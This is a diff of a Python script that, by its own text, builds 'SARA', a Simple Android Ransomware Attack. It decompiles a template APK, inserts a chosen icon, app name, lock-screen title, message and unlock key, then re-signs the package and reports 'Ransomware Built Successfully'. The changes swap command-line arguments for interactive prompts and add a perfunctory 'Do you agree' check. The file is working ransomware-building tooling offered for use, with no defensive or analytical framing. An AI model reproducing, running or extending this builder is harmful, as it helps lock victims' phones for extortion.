@@ -2,24 +2,13 @@
 import os, sys, time, fileinput
 from getpass import getpass
 from PIL import Image
-import sys
 
-r = "\033[1;31m"
-g = "\033[1;32m"
-y = "\033[1;33m"
-b = "\033[1;34m"
-d = "\033[2;37m"
-R = "\033[1;41m"
-Y = "\033[1;43m"
-B = "\033[1;44m"
-w = "\033[0m"
 
 app_icon = ""
 app_name = ""
 alert_title = ""
 alert_desc = ""
 key_pass = ""
-
 
 def writefile(file,old,new):
     while True:
@@ -31,53 +20,48 @@ def writefile(file,old,new):
                     line = line.replace(search,replaced)
                 print(line, end="")
             break
-        else: exit(r+"[!]"+w+" Failed to write in file "+file)
+        else: exit(" Failed to write in file "+file)
 
 def start():
     global app_icon, app_name, alert_title, alert_desc, key_pass
     os.system("clear")
-    print(f"""
-    {r}SARA{w} is a Simple Android Ransomware Attack
-    {w}The user can customize the App Icon, Name, Key and others.
-    {d}If you forgot the unlock key, just restart your phone !{w}
-    """)
-    print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+", "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(", %d/%m/%Y (%H.%M.%S)"))
-    print(b+">"+w+" Use \\n for newline and CTRL + C for exit")
-    print(w+"-"*43)
+    ask = input(" Do you agree (y/n): ").lower()
+    if ask in ("yes"): pass
+    else: exit(" Dont be evil !")
     while True:
-        x =sys.argv[1]
+        x = input("* SET app_icon (PNG only): ")
         if os.path.isfile(x):
             if ".png" in x:
                 app_icon = x
                 break
-            else: print(r+"[!]"+w+" File not accepted, PNG format only !")
-        else: print(r+"[!]"+w+" File not found, please fill correctly !")
+            else: print(" File not accepted, PNG format only !")
+        else: print(" File not found, please fill correctly !")
     while True:
-        x =sys.argv[2]
+        x = input("* SET app_name: ")
         if len(x) != 0:
             app_name = x
             break
         else: continue
     while True:
-        x =sys.argv[3]
+        x = input("* SET title: ")
         if len(x) != 0:
             alert_title = x
             break
         else: continue
     while True:
-        x =sys.argv[4]
+        x = input("* SET description: ")
         if len(x) != 0:
             alert_desc = x
             break
         else: continue
     while True:
-        x =sys.argv[5]
+        x = input("* SET unlock key: ")
         if len(x) != 0:
             key_pass = x
             break
         else: continue
-    print(w+"* Building your ransomware APK's ...")
-    print(w+"-"*43+d)
+    print("* Building your ransomware APK's ...")
+    print("-"*43)
     os.system("apktool d sara.apk")
     imgpath = [
         "sara/res/drawable-mdpi-v4/ic_launcher.png",
@@ -116,11 +100,12 @@ def start():
     if os.path.isfile("final-aligned-signed.apk"):
         out = app_name.replace(" ","").lower() + ".apk"
         os.system("mv final-aligned-signed.apk "+out)
-        getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
-    else: print(r+"[!]"+w+" Failed to signed APK's")
+        print(" Ransomware Built Successfully ")
+    else: print(" Failed to signed APK's")
 
 if __name__ == "__main__":
     try:
         start()
     except KeyboardInterrupt:
-        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    follow us \033[4mhttps://github.com/termuxhackers-id\033[0m\n    exiting ...")
+        exit("exiting ...")
+        
